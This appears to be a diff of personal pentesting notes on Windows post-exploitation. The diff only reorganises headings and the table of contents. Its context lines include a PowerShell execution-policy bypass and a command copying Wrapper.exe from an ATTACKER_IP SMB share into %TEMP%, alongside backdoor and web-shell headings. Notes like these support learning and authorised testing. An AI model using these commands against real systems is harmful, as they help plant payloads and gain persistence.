@@ -1,5 +1,6 @@
 - [[#Tools|Tools]]
 - [[#Abusing Internals|Abusing Internals]]
+- [[#Commands|Commands]]
 - [[#Stabilize / Post Exploit / Persistance windows|Stabilize / Post Exploit / Persistance windows]]
 	- [[#Stabilize / Post Exploit / Persistance windows#Tampering with low users|Tampering with low users]]
 	- [[#Stabilize / Post Exploit / Persistance windows#Backdoor|Backdoor]]
@@ -10,6 +11,7 @@
 	- [[#Stabilize / Post Exploit / Persistance windows#Web shell | mssql|Web shell | mssql]]
 - [[#Powershell|Powershell]]
 	- [[#Powershell#Enumeration|Enumeration]]
+- [[#SMB - 445|SMB - 445]]
 - [[#SMBMAP|SMBMAP]]
 - [[#GUI bypass|GUI bypass]]
 - [[#Auto Elevating|Auto Elevating]]
@@ -149,7 +151,7 @@
 
 - [Malware hook](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)
 
-# Commands
+## Commands
 - powershell -exec bypass
 - powershell -ep bypass
 - systeminof
@@ -386,7 +388,6 @@
 - web shell to web directory
 - default web server: iis apppool\defaultapppool
 
-
 ## Powershell
 - .NET framkework: software plattform für windows
 - Commands = cmdlets
@@ -467,7 +468,7 @@
 - Owner
   - Get-Acl
 
-# SMB - 445
+## SMB - 445
 - Server Message BLock
 - share of files on the network
 - Commands
@@ -500,7 +501,7 @@ copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
 net use \\ATTACKER_IP\share /del
 ```
 
-## SMBMAP
+### SMBMAP
 - Default
   - smbmap -H $target
   
